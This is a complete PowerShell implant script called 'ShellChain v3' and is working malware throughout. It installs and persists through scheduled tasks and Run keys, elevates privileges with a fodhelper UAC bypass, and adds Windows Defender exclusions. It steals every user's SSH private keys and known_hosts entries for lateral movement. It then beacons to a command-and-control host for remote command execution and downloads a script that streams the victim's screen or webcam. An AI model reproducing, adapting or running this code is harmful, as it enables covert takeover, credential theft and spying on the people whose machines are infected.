# stage5_v3.ps1 - ShellChain v3 autonomous implant
# Full lifecycle: install -> persist -> privesc -> exclude -> steal -> beacon

$__sp = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
Remove-Module PSReadLine -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'

# CONFIG
$C2_IP        = '192.168.0.100'
$C2_PORT      = 4444
$pf           = "$env:APPDATA\unicode"
$targetPs1    = Join-Path $pf "unicodeEBwdz.ps1"
$iptxt        = Join-Path $pf "ip.txt"
$porttxt      = Join-Path $pf "port.txt"
$cmdPs1       = Join-Path $pf "unicodecmd.ps1"
$errLog       = Join-Path $pf "err.txt"
$stateFile    = Join-Path $pf "state.json"

# HELPERS
function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Log-Error($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    [IO.File]::AppendAllText($errLog, "[$ts] $msg`n", [Text.Encoding]::UTF8)
}

function Get-State {
    if (Test-Path $stateFile) {
        $raw = Get-Content $stateFile -Raw -ErrorAction SilentlyContinue
        if ($raw) {
            try {
                $obj = $raw | ConvertFrom-Json
                $ht  = @{}
                $obj.PSObject.Properties | ForEach-Object { $ht[$_.Name] = $_.Value }
                if (-not $ht.ContainsKey('lateral_targets')) { $ht['lateral_targets'] = @() }
                if (-not $ht.ContainsKey('ssh_key_count'))   { $ht['ssh_key_count']   = 0 }
                return $ht
            } catch {}
        }
    }
    return @{
        installed         = $false
        privesc_attempted = $false
        privesc_success   = $false
        exclusions_added  = $false
        ssh_stolen        = $false
        ssh_key_count     = 0
        lateral_targets   = @()
    }
}

function Set-State($state) {
    [IO.File]::WriteAllText($stateFile, ($state | ConvertTo-Json -Depth 3), [Text.Encoding]::UTF8)
}

# STEGO ENCODER â€” StringBuilder keeps this O(n) not O(n^2)
function Encode-Stego {
    param($plaintext)
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($plaintext))
    $sb  = New-Object System.Text.StringBuilder
    foreach ($ch in $b64.ToCharArray()) {
        $bits = [Convert]::ToString([int][char]$ch, 2).PadLeft(16, '0')
        foreach ($b in $bits.ToCharArray()) {
            if ($b -eq '0') { [void]$sb.Append([char]0x200B) } else { [void]$sb.Append([char]0x200D) }
        }
    }
    $zw = $sb.ToString()
    return '$s="' + $zw + '";$o="";for($i=0;$i -lt $s.Length;$i+=16){$b="";for($j=0;$j -lt 16;$j++){$c=[int][char]$s[$i+$j];$b+=if($c -eq 0x200B){"0"}else{"1"}};$o+=[char]([Convert]::ToInt32($b,2))}$d=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($o));&([scriptblock]::Create($d))'
}

# FODHELPER UAC BYPASS
function Invoke-Fodhelper {
    param([string]$Command)
    if (Test-Admin) { return $true }
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    try {
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Command -Force
        Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 3
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Log-Error "FODHELPER_ERROR: $($_.Exception.Message)"
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# DEFENDER EXCLUSIONS
function Add-DefenderExclusions {
    if (-not (Test-Admin)) { return $false }
    try {
        Add-MpPreference -ExclusionPath $pf -ErrorAction Stop
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -ErrorAction SilentlyContinue
        foreach ($ext in @('.ps1', '.vbs', '.bat', '.cmd')) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        return $true
    } catch {
        Log-Error "DEFENDER_ERROR: $($_.Exception.Message)"
        return $false
    }
}

# SSH KEY THEFT â€” captures private keys, known_hosts, config (not just PRIVATE KEY files)
function Steal-SSHKeys {
    $keys = @()
    $userDirs = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
    foreach ($user in $userDirs) {
        $sshDir = Join-Path $user.FullName ".ssh"
        if (-not (Test-Path $sshDir)) { continue }
        foreach ($file in (Get-ChildItem $sshDir -File -ErrorAction SilentlyContinue)) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction Stop
                if ($content -match 'PRIVATE KEY') {
                    $type = 'PRIVATE'
                } elseif ($file.Name -eq 'known_hosts') {
                    $type = 'KNOWN_HOSTS'
                } elseif ($file.Name -eq 'config') {
                    $type = 'CONFIG'
                } elseif ($content -match '^ssh-') {
                    $type = 'PUBLIC'
                } else {
                    continue
                }
                $keys += @{ user = $user.Name; name = $file.Name; type = $type; content = $content }
            } catch {}
        }
    }
    return $keys
}

# Parse known_hosts for lateral movement targets
function Get-LateralTargets($keys) {
    $targets = [System.Collections.Generic.List[string]]::new()
    foreach ($kh in ($keys | Where-Object { $_.type -eq 'KNOWN_HOSTS' })) {
        foreach ($line in ($kh.content -split "`n")) {
            $line = $line.Trim()
            if ($line -and $line -notmatch '^#' -and $line -match '^([^\s,\[]+)') {
                [void]$targets.Add($matches[1])
            }
        }
    }
    return ($targets | Select-Object -Unique)
}

# OPENSSL INSTALL
function Install-OpenSSH {
    if (-not (Test-Admin)) { return $false }
    if (Test-Path "$env:WINDIR\System32\OpenSSH\ssh.exe") { return $true }
    try {
        Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop
        return $true
    } catch {
        Log-Error "SSH_INSTALL_ERROR: $($_.Exception.Message)"
        return $false
    }
}

# PERSISTENCE
function Install-Persistence {
    $isAdmin    = Test-Admin
    $conhostArg = "--headless powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    try {
        $action   = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument $conhostArg
        $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    } catch {
        Log-Error "TASK_INIT_ERROR: $($_.Exception.Message)"
        return
    }
    if ($isAdmin) {
        try {
            $trigger = New-ScheduledTaskTrigger -AtStartup
            Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        } catch { Log-Error "TASK_ADMIN_ERROR: $($_.Exception.Message)" }
        try { Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg" } catch { Log-Error "HKLM_ERROR: $($_.Exception.Message)" }
    } else {
        try {
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 311) -RepetitionDuration (New-TimeSpan -Days 9999)
            Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force | Out-Null
        } catch { Log-Error "TASK_USER_ERROR: $($_.Exception.Message)" }
        try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg" } catch { Log-Error "HKCU_ERROR: $($_.Exception.Message)" }
    }
}

# ============================================================
# INSTALL BRANCH â€” first execution, targetPs1 doesn't exist yet
# ============================================================
if (-not (Test-Path $targetPs1)) {
    New-Item -ItemType Directory -Force -Path $pf | Out-Null
    try { Copy-Item $__sp $targetPs1 -Force } catch { Log-Error "COPY_ERROR: $($_.Exception.Message)" }
    if (-not (Test-Path $iptxt))   { Set-Content -Path $iptxt   -Value $C2_IP }
    if (-not (Test-Path $porttxt)) { Set-Content -Path $porttxt -Value $C2_PORT }

    Set-State @{
        installed         = $true
        privesc_attempted = $false
        privesc_success   = (Test-Admin)
        exclusions_added  = $false
        ssh_stolen        = $false
        ssh_key_count     = 0
        lateral_targets   = @()
        install_time      = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    }

    Install-Persistence

    try { Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`"" -WindowStyle Hidden } catch { Log-Error "SPAWN_ERROR: $($_.Exception.Message)" }
    Start-Sleep -Milliseconds 500
    if ($__sp -notmatch 'shellchain') { Remove-Item $__sp -Force -ErrorAction SilentlyContinue }
    exit
}

# ============================================================
# RUN BRANCH â€” persistence check + post-exploitation + beacon
# ============================================================

if (-not (Get-ScheduledTask -TaskName "Unicode" -ErrorAction SilentlyContinue)) {
    Install-Persistence
}

$state = Get-State

# PHASE 1: privesc if medium integrity and not yet tried
if (-not (Test-Admin) -and -not $state.privesc_attempted) {
    $state.privesc_attempted = $true
    Set-State $state

    $elevatedCmd = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    Invoke-Fodhelper -Command $elevatedCmd

    # Wait for elevated instance to start and write state
    Start-Sleep -Seconds 8
    $fresh = Get-State
    if ($fresh.privesc_success) {
        # Elevated instance is running and has taken over â€” exit to avoid dual-beacon
        exit
    }
    # Fodhelper didn't work â€” continue beaconing at medium integrity
}

# PHASE 2: admin-only tasks
if (Test-Admin) {
    $state.privesc_success = $true

    if (-not $state.exclusions_added) {
        if (Add-DefenderExclusions) { $state.exclusions_added = $true }
    }

    Install-Persistence  # upgrade to SYSTEM-level if not already
    Install-OpenSSH
    Set-State $state
}

# PHASE 3: SSH theft â€” runs at any integrity level
if (-not $state.ssh_stolen) {
    $keys = Steal-SSHKeys
    if ($keys.Count -gt 0) {
        $state.ssh_stolen      = $true
        $state.ssh_key_count   = $keys.Count
        $state.lateral_targets = @(Get-LateralTargets $keys)

        $keysFile = Join-Path $pf "ssh_keys.json"
        [IO.File]::WriteAllText($keysFile, ($keys | ConvertTo-Json -Depth 3 -Compress), [Text.Encoding]::UTF8)
    }
    Set-State $state
}

# ============================================================
# C2 BEACON LOOP â€” exponential backoff, lifetime reconnect
# ============================================================
$targetIP     = if (Test-Path $iptxt)   { (Get-Content $iptxt -Raw).Trim() } else { $C2_IP }
$landingPort  = if (Test-Path $porttxt) { [int](Get-Content $porttxt -Raw).Trim() } else { $C2_PORT }
$targetPort   = $landingPort
$migrating    = $false

# VNC state -- background runspace, no new process spawned
$vncPs       = $null
$vncRunspace = $null
$vncScript   = Join-Path $pf "vnc_stream.ps1"
$baseRetry    = 30
$maxRetry     = 300
$currentRetry = $baseRetry
$lifetimeSecs = 300

while ($true) {
    if (-not $migrating) { $targetPort = $landingPort; $currentRetry = $baseRetry }
    $migrating = $false

    $client = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($targetIP, $targetPort)
    } catch {
        if ($client) { $client.Close() }
        Start-Sleep -Seconds $currentRetry
        $currentRetry = [Math]::Min($currentRetry * 2, $maxRetry)
        continue
    }

    if (-not $client.Connected) {
        $client.Close()
        Start-Sleep -Seconds $currentRetry
        $currentRetry = [Math]::Min($currentRetry * 2, $maxRetry)
        continue
    }

    $currentRetry = $baseRetry
    $stream  = $client.GetStream()
    $writer  = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
    $reader  = New-Object System.IO.StreamReader($stream)

    $adminStr   = if (Test-Admin) { "ADMIN" } else { "USER" }
    $sshStr     = if ($state.ssh_stolen) { "SSH:$($state.ssh_key_count)" } else { "SSH:0" }
    $tgtCount   = if ($state.lateral_targets) { @($state.lateral_targets).Count } else { 0 }
    $writer.WriteLine("[+] $env:COMPUTERNAME\$env:USERNAME | $adminStr | $sshStr | TARGETS:$tgtCount | PID:$PID")

    $timerActive = $true
    $startTime   = Get-Date

    try {
        while ($client.Connected) {
            if ($timerActive -and ((Get-Date) - $startTime).TotalSeconds -ge $lifetimeSecs) {
                $writer.WriteLine("[!] Lifetime reconnect")
                break
            }

            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if (-not ($cmd -and $cmd.Trim())) { continue }
                if ($timerActive) { $timerActive = $false }
                $ct = $cmd.Trim().ToLower()

                try {
                    switch -Regex ($ct) {
                        '^exit$' {
                            $writer.WriteLine("[*] Session closed.")
                            $client.Close()
                            break
                        }
                        '^migrate \d+$' {
                            $newPort = [int]($ct.Split()[1])
                            $writer.WriteLine("[*] Migrating to port $newPort")
                            $targetPort = $newPort; $migrating = $true
                            $client.Close()
                            break
                        }
                        '^privesc$' {
                            if (Test-Admin) {
                                $writer.WriteLine("[+] Already admin")
                            } else {
                                $writer.WriteLine("[*] Attempting fodhelper...")
                                Invoke-Fodhelper -Command "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
                                $writer.WriteLine("[*] Fodhelper triggered -- watch for new elevated session")
                            }
                            break
                        }
                        '^ssh-dump$' {
                            $keysFile = Join-Path $pf "ssh_keys.json"
                            if (Test-Path $keysFile) { $writer.WriteLine((Get-Content $keysFile -Raw)) }
                            else { $writer.WriteLine("[!] No SSH keys captured") }
                            break
                        }
                        '^targets$' {
                            $tgts = @($state.lateral_targets)
                            if ($tgts.Count -gt 0) { $writer.WriteLine($tgts -join "`n") }
                            else { $writer.WriteLine("[!] No lateral targets in known_hosts") }
                            break
                        }
                        '^state$' {
                            $state = Get-State
                            $writer.WriteLine(($state | ConvertTo-Json))
                            break
                        }
                        '^vnc-start (screen|webcam) \d+$' {
                            $parts   = $ct.Split(' ')
                            $vncMode = $parts[1]
                            $vncPort = [int]$parts[2]
                            # Download vnc_stream.ps1 from VPS payload server if not cached
                            if (-not (Test-Path $vncScript)) {
                                try {
                                    (New-Object Net.WebClient).DownloadFile(
                                        "http://${targetIP}:8888/get/vnc_stream.ps1", $vncScript)
                                } catch {
                                    $writer.WriteLine("[!] VNC script download failed: $_")
                                    break
                                }
                            }
                            # Stop any existing VNC runspace
                            if ($vncPs)       { try { $vncPs.Stop() }        catch {} }
                            if ($vncRunspace) { try { $vncRunspace.Dispose() } catch {} }
                            # Launch in background runspace -- stays inside this powershell.exe process
                            $vncRunspace = [runspacefactory]::CreateRunspace()
                            $vncRunspace.Open()
                            $vncPs = [powershell]::Create()
                            $vncPs.Runspace = $vncRunspace
                            $vncCode = Get-Content $vncScript -Raw -ErrorAction Stop
                            [void]$vncPs.AddScript($vncCode)
                            [void]$vncPs.AddParameter('IP',         $targetIP)
                            [void]$vncPs.AddParameter('Port',       $vncPort)
                            [void]$vncPs.AddParameter('Mode',       $vncMode)
                            [void]$vncPs.AddParameter('PayloadDir', $pf)
                            [void]$vncPs.AddParameter('FPS',        10)
                            [void]$vncPs.AddParameter('Quality',    50)
                            [void]$vncPs.BeginInvoke()
                            $writer.WriteLine("[+] VNC $vncMode started -- relay port $vncPort")
                            break
                        }
                        '^vnc-stop$' {
                            if ($vncPs)       { try { $vncPs.Stop() }        catch {} }
                            if ($vncRunspace) { try { $vncRunspace.Dispose() } catch {} }
                            $vncPs = $null; $vncRunspace = $null
                            $writer.WriteLine("[*] VNC stopped")
                            break
                        }
                        '^(cd|set-location)(\s|$)' {
                            Invoke-Expression $cmd 2>&1 | Out-Null
                            $writer.WriteLine((Get-Location).Path)
                            break
                        }
                        default {
                            $script = Encode-Stego $cmd
                            [IO.File]::WriteAllText($cmdPs1, $script, [Text.Encoding]::UTF8)
                            $out = (powershell.exe -NoP -ExecutionPolicy Bypass -File $cmdPs1 2>&1 | Out-String).TrimEnd()
                            Remove-Item $cmdPs1 -Force -ErrorAction SilentlyContinue
                            $writer.WriteLine($out)
                        }
                    }
                } catch { $writer.WriteLine("Error: $($_.Exception.Message)") }
            }
            Start-Sleep -Milliseconds 50
        }
    } catch {}

    if ($client) { try { $client.Close() } catch {} }
    if (-not $migrating) { Start-Sleep -Seconds $currentRetry }
}
